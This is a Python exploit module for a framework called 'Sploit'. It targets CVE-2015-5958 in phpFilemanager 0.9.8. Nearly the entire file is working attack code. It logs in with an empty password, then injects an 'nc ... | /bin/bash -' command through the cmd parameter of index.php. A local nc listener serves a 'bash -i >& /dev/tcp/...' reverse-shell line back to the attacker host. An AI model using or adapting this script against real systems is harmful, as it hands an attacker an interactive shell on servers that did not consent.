from Sploit import Sploit
from collections import OrderedDict
from shellcodes.Shellcodes import OSShellcodes

import argparse
import requests,sys,os
import threading

INFO = {}
INFO['NAME'] = "RCE phpFilemanager-0.9.8"
INFO['DESCRIPTION'] = "RCE phpFilemanager-0.9.8"
INFO['VENDOR'] = ""
INFO['CVE Name'] = "CVE-2015-5958"
INFO['NOTES'] = """
"""
INFO['DOWNLOAD_LINK'] = ""
INFO['LINKS'] = [""]
INFO['CHANGELOG'] = "1.0 14.02.20"
INFO['PATH'] = "Developed/" #folder on website
INFO['AUTHOR'] = "dmts"

OPTIONS = OrderedDict()
OPTIONS["URL"] = "example.com", dict(description = 'URL to phpFilemanager-0.9.8')
#OPTIONS["COMMAND"] = "id", dict(description = 'Command to run')
OPTIONS["LOCAL_IP_ADDRESS"] = "192.168.1.115", dict(description = 'IP address for reverse connection (ex. 192.168.10.20)')
OPTIONS["REVERSE_CONNECTION_PORT"] = "4000", dict(description = 'Reverse connection port for shellcode')
#####################################################################
class exploit(Sploit):
	def __init__(self,url="example.xom",ip="127.0.0.1",portr="4000",logger=None):
		Sploit.__init__(self, logger=logger)
		self.name = INFO['NAME'] 
		self.url = url
		#self.command = command
		self.ip = ip
		self.portr = portr
	def args(self):
		self.args = Sploit.args(self, OPTIONS)
		self.url = self.args.get("URL", self.url)
		#self.command = self.args.get("COMMAND", self.command)
		self.ip = self.args.get("LOCAL_IP_ADDRESS", self.ip)
		self.portr = self.args.get("REVERSE_CONNECTION_PORT", self.portr)

	def transfer(self):
	        conn = "echo \"bash -i >& /dev/tcp/"+self.ip+"/"+self.portr+" 0>&1\" |nc -l 1212"
        	os.system(conn)

	def listener(self):
        	conn = 'nc -l '+self.portr
		os.system(conn)

	def attack(self):
		session = requests.session()
		self.log('Connecting to '+self.url)
		try:
			url='http://'+self.url+'/index.php'
			params={'frame':3,'pass':''}
			get_in =session.post(url,data=params)
			get_in.raise_for_status()
		except Exception as e:
			self.log('[!] [FAIL] Failed to access : ')
			self.log(e)
			sys.exit(1)
		try:
			self.log('Creating reverse connection...')
	                x = threading.Thread(target=self.transfer, args=())
        	        x.start()
                	#y = threading.Thread(target=self.listener, args=())
        	        #y.start()
			self.log('Starting reverse connection..')
	                command="nc -w 2 "+self.ip+" 1212 | /bin/bash -"
                	url=url+'?action=6&cmd='+command
	                resp =session.get(url,timeout=3)
	        except requests.exceptions.ReadTimeout:
			x.join()
                	#y.join()
	        except :
        	        print('\33[1;31;40m[!] [FAIL]\33[0m\nFailed to establish connection')
                	sys.exit(1)

	def run(self):
		self.args()
		self.log('Starting')
		######### MAIN CODE ###########
		self.attack()
		###############################
        	self.finish(True)

#####################################################################
if __name__ == '__main__':
    print"Running exploit %s .. " % INFO['NAME']
    e = exploit()
    e.run()



